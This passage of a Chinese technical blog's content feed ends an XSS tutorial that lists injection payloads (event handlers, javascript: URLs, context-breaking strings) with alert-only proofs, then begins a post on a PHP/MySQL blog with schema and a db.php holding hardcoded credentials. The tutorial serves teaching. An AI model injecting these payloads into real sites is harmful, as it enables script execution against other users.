<code>&lt;object&gt;</code>标签</h4><ul><li><strong>Payload：</strong> <code>&lt;embed src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</code></li><li><strong>原理：</strong> 类似于 <code>iframe</code>，这些用于嵌入外部资源的标签也可以执行 JavaScript 协议。</li></ul><h4 id="3-2-3-标签"><a href="#3-2-3-标签" class="headerlink" title="3.2.3 &lt;video&gt;&#x2F; &lt;audio&gt;标签"></a>3.2.3 <code>&lt;video&gt;</code>&#x2F; <code>&lt;audio&gt;</code>标签</h4><ul><li><strong>Payload：</strong> <code>&lt;video&gt;&lt;source onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;&lt;/video&gt;</code></li></ul><ul><li><strong>原理：</strong> 和 <code>img</code>标签的 <code>onerror</code>原理类似，当媒体资源加载失败时触发。</li></ul><h4 id="3-2-4-标签"><a href="#3-2-4-标签" class="headerlink" title="3.2.4 &lt;form&gt;标签"></a>3.2.4 <code>&lt;form&gt;</code>标签</h4><ul><li><strong>Payload：</strong><code>&lt;form action=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;&lt;input type=&quot;submit&quot;&gt;</code></li></ul><ul><li><strong>原理：</strong> 表单的 <code>action</code>属性可以设置为 JavaScript 协议。当用户点击提交按钮时触发。</li></ul><h4 id="3-2-5-标签（需要可注入到中）"><a href="#3-2-5-标签（需要可注入到中）" class="headerlink" title="3.2.5 &lt;meta&gt;标签（需要可注入到&lt;head&gt;中）"></a>3.2.5 <code>&lt;meta&gt;</code>标签（需要可注入到<code>&lt;head&gt;</code>中）</h4><ul><li><strong>Payload：</strong><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=javascript:alert(&#39;XSS&#39;)&quot;&gt;</code></li></ul><ul><li><strong>原理：</strong> 利用 <code>meta</code>标签进行重定向到 JavaScript 协议。</li></ul><h3 id="3-3-利用-javascript-伪协议"><a href="#3-3-利用-javascript-伪协议" class="headerlink" title="3.3 利用 javascript:伪协议"></a>3.3 利用 <code>javascript:</code>伪协议</h3><ul><li><p>这种载荷主要用于可以设置URL的属性。</p></li><li><p><strong>Payload：</strong><code>&lt;a href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;点击我&lt;/a&gt;</code></p></li><li><p><strong>原理：</strong> 当用户点击这个链接时，浏览器会执行 <code>href</code>属性中的 JavaScript 代码。</p></li></ul><h2 id="4-XSS可以插入在哪里"><a href="#4-XSS可以插入在哪里" class="headerlink" title="4. XSS可以插入在哪里"></a>4. XSS可以插入在哪里</h2><ul><li>无论用户输入被放置在哪个HTML上下文中，攻击者的目标都是一致的：<strong>通过输入特定的闭合字符（如 <code>&quot;&gt;</code>， <code>--&gt;</code>， <code>&lt;/style&gt;</code>等）来提前结束当前的上下文，然后紧接着注入可执行的JavaScript代码</strong></li></ul><h3 id="4-1-用户输入作为标签内容"><a href="#4-1-用户输入作为标签内容" class="headerlink" title="4.1 用户输入作为&lt;script&gt;标签内容"></a>4.1 用户输入作为<code>&lt;script&gt;</code>标签内容</h3><ul><li><p><strong>示例：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> input = <span class="string">&quot;用户输入&quot;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>攻击思路：</strong>逃逸出JS字符串的上下文，直接执行代码。</p></li><li><p><strong>Payload：</strong><code>&quot;; alert(&quot;XSS&quot;); //</code></p></li><li><p><strong>最终效果：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> input = <span class="string">&quot;&quot;</span>; <span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>); <span class="comment">//&quot;;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>攻击原理：</strong> 用<code>&quot;</code>闭合前引号，<code>;</code>结束原语句，然后注入恶意代码，<code>//</code>注释掉后续内容。</p></li></ul><h3 id="4-2-用户输入作为HTML注释的内容"><a href="#4-2-用户输入作为HTML注释的内容" class="headerlink" title="4.2 用户输入作为HTML注释的内容"></a>4.2 用户输入作为HTML注释的内容</h3><ul><li><p><strong>示例：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户输入 ---&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>攻击思路：</strong>提前闭合注释符号，讲后续内容变为可以执行的HTML。</p></li><li><p><strong>Payload：</strong><code>---&gt; &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt; &lt;!--</code></p></li><li><p><strong>最终效果：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ---&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- ---&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>攻击原理：</strong> <code>--&gt;</code>闭合当前注释，注入恶意标签，<code>&lt;!--</code>平衡掉页面原有的结束注释。</p></li></ul><h3 id="4-3-用户输入作为HTML标签的属性名"><a href="#4-3-用户输入作为HTML标签的属性名" class="headerlink" title="4.3 用户输入作为HTML标签的属性名"></a>4.3 用户输入作为HTML标签的属性名</h3><ul><li><p><strong>示例：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">用户输入</span>=<span class="string">&quot;value&quot;</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>攻击思路：</strong>闭合当前标签，注入新的标签。</p></li><li><p><strong>Payload：</strong><code>&gt; &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt; &lt;div a</code></p></li><li><p><strong>最终效果：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> &gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;value&quot;</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>攻击原理：</strong> <code>&gt;</code>闭合当前标签，注入脚本，新增一个标签属性名以”吞掉”原页面后续的 <code>=&quot;value&quot;</code>。</p></li></ul><h3 id="4-4-用户输入作为HTML标签的属性值"><a href="#4-4-用户输入作为HTML标签的属性值" class="headerlink" title="4.4 用户输入作为HTML标签的属性值"></a>4.4 用户输入作为HTML标签的属性值</h3><ul><li><p><strong>示例：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;用户输入&quot;</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>攻击思路：</strong> 逃逸出属性值上下文，闭合标签。</p></li><li><p><strong>Payload：</strong></p><ol><li><code>&quot;&gt; &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt; &lt;div a=&quot;</code></li><li><code>&quot; onclick=&quot;alert(&#39;XSS&#39;)</code></li></ol></li><li><p><strong>最终效果1（闭合标签）：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;&quot;</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>最终效果2（事件处理器）：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>攻击原理：</strong></p><ul><li><strong>方式1：</strong>用<code>&quot;&gt;</code>闭合属性值和当前标签，然后直接注入脚本。</li><li><strong>方式2：</strong>用<code>&quot;</code>闭合属性值，然后添加一个带JS代码的事件属性（如<code>onclick</code>）。</li></ul><h3 id="4-5-用户输入最为HTML标签的名字"><a href="#4-5-用户输入最为HTML标签的名字" class="headerlink" title="4.5 用户输入最为HTML标签的名字"></a>4.5 用户输入最为HTML标签的名字</h3><ul><li><p><strong>示例：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">用户输入</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">用户输入</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>攻击思路：</strong> 注入一个可执行脚本的标签，或闭合无效标签。</p></li><li><p><strong>Payload：</strong><code>script&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;b</code></p></li><li><p><strong>最终效果：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">b</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span>标题 <span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>攻击原理：</strong> 输入一个合法的HTML标签（如<code>script</code>）来执行代码，或者使用<code>&gt;</code>闭合一个无效的开始标签<code>&lt;&gt;</code>，然后注入脚本。后续的<code>&lt;b</code>用于平衡结构。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> TOP TEN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于PHP后端搭建的简单博客系统介绍</title>
      <link href="/2025/11/14/%E5%9F%BA%E4%BA%8EPHP%E5%90%8E%E7%AB%AF%E6%90%AD%E5%BB%BA%E7%9A%84%E7%AE%80%E5%8D%95%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/"/>
      <url>/2025/11/14/%E5%9F%BA%E4%BA%8EPHP%E5%90%8E%E7%AB%AF%E6%90%AD%E5%BB%BA%E7%9A%84%E7%AE%80%E5%8D%95%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="基于PHP后端搭建的简单博客系统介绍"><a href="#基于PHP后端搭建的简单博客系统介绍" class="headerlink" title="基于PHP后端搭建的简单博客系统介绍"></a>基于PHP后端搭建的简单博客系统介绍</h1><h2 id="第一部分：项目概述"><a href="#第一部分：项目概述" class="headerlink" title="第一部分：项目概述"></a>第一部分：项目概述</h2><h3 id="1-项目名称"><a href="#1-项目名称" class="headerlink" title="1. 项目名称"></a>1. 项目名称</h3><ul><li>基于PHPStudy的简易个人博客系统</li></ul><h3 id="2-项目简介"><a href="#2-项目简介" class="headerlink" title="2. 项目简介"></a>2. 项目简介</h3><ul><li>这是一个采用经典<strong>WAMP</strong>（Windows&#x2F;Apache&#x2F;MySQL&#x2F;PHP）架构的轻量级博客系统。系统部署在高度集成的PHPStudy环境中，实现了博客文章的动态发布、管理和展示等核心功能。该系统结构清晰、代码简单，非常适合作为Web开发的入门学习项目。</li></ul><h3 id="3-项目目标"><a href="#3-项目目标" class="headerlink" title="3. 项目目标"></a>3. 项目目标</h3><ul><li>主要通过搭建简单的博客系统，来理解掌握PHP原生语法、MySQL数据库操作以及前后端数据交互的基本原理。</li></ul><h2 id="第二部分：技术框架"><a href="#第二部分：技术框架" class="headerlink" title="第二部分：技术框架"></a>第二部分：技术框架</h2><table><thead><tr><th align="center"></th><th align="center">技术选型</th><th align="center">版本</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><strong>开发环境</strong></td><td align="center"><strong>PHPStudy</strong></td><td align="center">v8</td><td align="center">核心工具。集成了Apache、MySQL、PHP等必要组件，极大简化了环境配置流程，实现一键启动服务。</td></tr><tr><td align="center"><strong>服务器</strong></td><td align="center">Apache</td><td align="center">2.4.39</td><td align="center">Web服务器，负责处理HTTP请求和响应。</td></tr><tr><td align="center"><strong>后端语言</strong></td><td align="center">PHP</td><td align="center">7.3.4</td><td align="center">服务器端脚本语言，负责处理业务逻辑，如连接数据库、处理表单提交、生成动态页面。</td></tr><tr><td align="center"><strong>数据库</strong></td><td align="center">MySQL</td><td align="center">5.7.26</td><td align="center">关系型数据库，用于存储博客的核心数据，如文章、评论、用户信息等。</td></tr><tr><td align="center"><strong>前端技术</strong></td><td align="center">HTML, CSS</td><td align="center"></td><td align="center">构建用户界面和交互。HTML负责页面结构，CSS负责样式美化。</td></tr><tr><td align="center">数据库操作方式</td><td align="center">PDO</td><td align="center"></td><td align="center">PHP连接和操作MySQL数据库的扩展。</td></tr></tbody></table><h2 id="第三部分：项目功能"><a href="#第三部分：项目功能" class="headerlink" title="第三部分：项目功能"></a>第三部分：项目功能</h2><ul><li>此项目包含的功能有基本的用户注册、登录、登出，以及文章写入、编辑、删除和评论功能，部分前端写出来的功能没有在后端实现。</li></ul><h3 id="1-注册功能"><a href="#1-注册功能" class="headerlink" title="1. 注册功能"></a>1. 注册功能</h3><p><img src="/../images/phpBlog/1.png" alt="1"></p><h3 id="2-登录功能"><a href="#2-登录功能" class="headerlink" title="2. 登录功能"></a>2. 登录功能</h3><p><img src="/../images/phpBlog/2.png" alt="2"></p><h3 id="3-按发布顺序在首页展示用户文章"><a href="#3-按发布顺序在首页展示用户文章" class="headerlink" title="3. 按发布顺序在首页展示用户文章"></a>3. 按发布顺序在首页展示用户文章</h3><ul><li>在首页我们可以看到我们发布过的文章，包括文章的作者，发布时间等信息。</li></ul><p><img src="/../images/phpBlog/3.png" alt="3"></p><h3 id="4-写文章、编辑文章"><a href="#4-写文章、编辑文章" class="headerlink" title="4. 写文章、编辑文章"></a>4. 写文章、编辑文章</h3><ul><li>在控制台里我们可以编辑之前写过的文章，或者写新文章，又或者删除文章，同时可以看到文章的发布状态。</li></ul><p><img src="/../images/phpBlog/4.png" alt="4"></p><h3 id="5-评论功能"><a href="#5-评论功能" class="headerlink" title="5. 评论功能"></a>5. 评论功能</h3><ul><li>在写好的文章下用户可以看到评论功能，并对文章做出评价。</li></ul><p><img src="/../images/phpBlog/5.png" alt="5"></p><h2 id="第四部分：数据库设计"><a href="#第四部分：数据库设计" class="headerlink" title="第四部分：数据库设计"></a>第四部分：数据库设计</h2><ul><li>下面是数据库部分的设计代码</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 用户表</span></span><br><span class="line"><span class="keyword">CREATE TABLE</span> users (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">    email <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    created_at DATETIME <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">    reset_token <span class="type">VARCHAR</span>(<span class="number">255</span>),</span><br><span class="line">    reset_token_expiry DATETIME</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 博客文章表</span></span><br><span class="line"><span class="keyword">CREATE TABLE</span> posts (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    title <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    content TEXT <span class="keyword">NOT NULL</span>,</span><br><span class="line">    author_id <span class="type">INT</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">    created_at DATETIME <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">    updated_at DATETIME <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">    <span class="keyword">FOREIGN KEY</span> (author_id) <span class="keyword">REFERENCES</span> users(id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 评论表</span></span><br><span class="line"><span class="keyword">CREATE TABLE</span> comments (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    post_id <span class="type">INT</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">    user_id <span class="type">INT</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">    content TEXT <span class="keyword">NOT NULL</span>,</span><br><span class="line">    created_at DATETIME <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">    parent_id <span class="type">INT</span>, <span class="comment">-- 用于回复功能</span></span><br><span class="line">    <span class="keyword">FOREIGN KEY</span> (post_id) <span class="keyword">REFERENCES</span> posts(id),</span><br><span class="line">    <span class="keyword">FOREIGN KEY</span> (user_id) <span class="keyword">REFERENCES</span> users(id),</span><br><span class="line">    <span class="keyword">FOREIGN KEY</span> (parent_id) <span class="keyword">REFERENCES</span> comments(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="1-用户表（users）"><a href="#1-用户表（users）" class="headerlink" title="1. 用户表（users）"></a>1. 用户表（users）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> users (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br></pre></td></tr></table></figure><ul><li><p><code>CREATE TABLE users</code>：创建名为users的表</p></li><li><p><code>id INT AUTO_INCREMENT PRIMARY KEY</code>：用户唯一标识符<code>id</code>，自动递增<code>AUTO_INCREMENT</code>的整数<code>INT</code>，作为主键<code>PRIMARY KEY</code>。</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT NULL</span>,</span><br></pre></td></tr></table></figure><ul><li><p><code>username VARCHAR(50)</code>：用户名，限制长度为50个字符。</p></li><li><p><code>UNIQUE</code>：数据库中的<strong>UNIQUE约束</strong>，确保一列或多列中所有的值都是唯一的，所以在约束应用的列中不能有重复的值。</p></li><li><p><code>NOT NULL</code>：在<strong>UNIQUE约束</strong>中允许列中的值为空，所以这里用<code>NOT NULL</code>来规定列中的值不能为空值。</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">email <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">password <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>,</span><br></pre></td></tr></table></figure><ul><li>与上面的写法基本类似，不再解释。</li><li>这里的密码表没有使用<strong>UNIQUE约束</strong>是因为密码本就是只有用户自己知道，所以一致没有影响，而且<code>VARCHAR(255)</code>是因为我们需要存储HASH加密后的密码，所以长度限定为255个字符。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">created_at DATETIME <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br></pre></td></tr></table></figure><ul><li>当插入新的值时MySQL会自动将<code>created_at</code>字段的值设置成当前的日期和时间。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reset_token <span class="type">VARCHAR</span>(<span class="number">255</span>),</span><br><span class="line">    reset_token_expiry DATETIME</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><code>reset_token</code>：密码重置令牌（用于“忘记密码”功能）。</li><li><code>reset_token_expiry</code>：令牌过期时间。</li></ul><h3 id="2-文章表（posts）"><a href="#2-文章表（posts）" class="headerlink" title="2. 文章表（posts）"></a>2. 文章表（posts）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> posts (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br></pre></td></tr></table></figure><ul><li>与用户表类似，文章的唯一标识符，自动递增主键。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>,</span><br></pre></td></tr></table></figure><ul><li>存放文章标题，最长255字符，不能为空。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content TEXT <span class="keyword">NOT NULL</span>,</span><br></pre></td></tr></table></figure><ul><li>存放文章内容，<code>TEXT</code>类型适合存储长文本，不能为空。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">author_id <span class="type">INT</span> <span class="keyword">NOT NULL</span>,</span><br></pre></td></tr></table></figure><ul><li>存放作者的用户ID，外键关联到users表。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">created_at DATETIME <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">    updated_at DATETIME <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br></pre></td></tr></table></figure><ul><li><code>created_at</code>：文章创建时间，由MySQL自动设置。</li><li><code> updated_at</code>：文章最后修改时间，由MySQL自动设置。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FOREIGN KEY</span> (author_id) <span class="keyword">REFERENCES</span> users(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><strong>外键约束：</strong>确保<code>author_id</code>必须存在于users表的id中。</li></ul><h3 id="3-评论表（comments）"><a href="#3-评论表（comments）" class="headerlink" title="3. 评论表（comments）"></a>3. 评论表（comments）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> comments (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br></pre></td></tr></table></figure><ul><li>评论的唯一标识符</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_id <span class="type">INT</span> <span class="keyword">NOT NULL</span>,</span><br></pre></td></tr></table></figure><ul><li><code>post_id</code>：用来存放评论所属的文章ID。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_id <span class="type">INT</span> <span class="keyword">NOT NULL</span>,</span><br></pre></td></tr></table></figure><ul><li><code>user_id</code>：用来存放发表评论的用户ID。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content TEXT <span class="keyword">NOT NULL</span>,</span><br></pre></td></tr></table></figure><ul><li><code>content</code>：用来存放评论内容。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">created_at DATETIME <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span></span><br></pre></td></tr></table></figure><ul><li>存放评论发表时间，由MySQL自行设置。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent_id <span class="type">INT</span>,</span><br></pre></td></tr></table></figure><ul><li><code>parent_id</code>：实现回复功能，指向被回复的评论ID。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FOREIGN KEY</span> (post_id) <span class="keyword">REFERENCES</span> posts(id),</span><br><span class="line">    <span class="keyword">FOREIGN KEY</span> (user_id) <span class="keyword">REFERENCES</span> users(id),</span><br><span class="line">    <span class="keyword">FOREIGN KEY</span> (parent_id) <span class="keyword">REFERENCES</span> comments(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><strong>三个外键约束</strong>：确保数据完整性和关联性。</li></ul><h2 id="第五部分：后端实现"><a href="#第五部分：后端实现" class="headerlink" title="第五部分：后端实现"></a>第五部分：后端实现</h2><ul><li>整个博客系统的树形图展示如下：（其中CSS部分不会在本次汇报中展示）。</li></ul><p><img src="/../images/phpBlog/6.png" alt="6"></p><h3 id="1-includes文件夹"><a href="#1-includes文件夹" class="headerlink" title="1. includes文件夹"></a>1. includes文件夹</h3><ul><li>此文件夹下包含了两个文件<code>auth.php</code>，<code>db.php</code>。</li></ul><h4 id="1-1-db-php（数据库连接模块）"><a href="#1-1-db-php（数据库连接模块）" class="headerlink" title="1.1 db.php（数据库连接模块）"></a>1.1 <code>db.php</code>（数据库连接模块）</h4><ul><li>这个文件负责建立应用程序与数据库之间的连接。它被其他需要操作数据库的页面（如调用上述 <code>auth.php</code>中函数的页面）所包含。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;localhost:3316&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;blog_sql&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;blog&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;blog123&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ 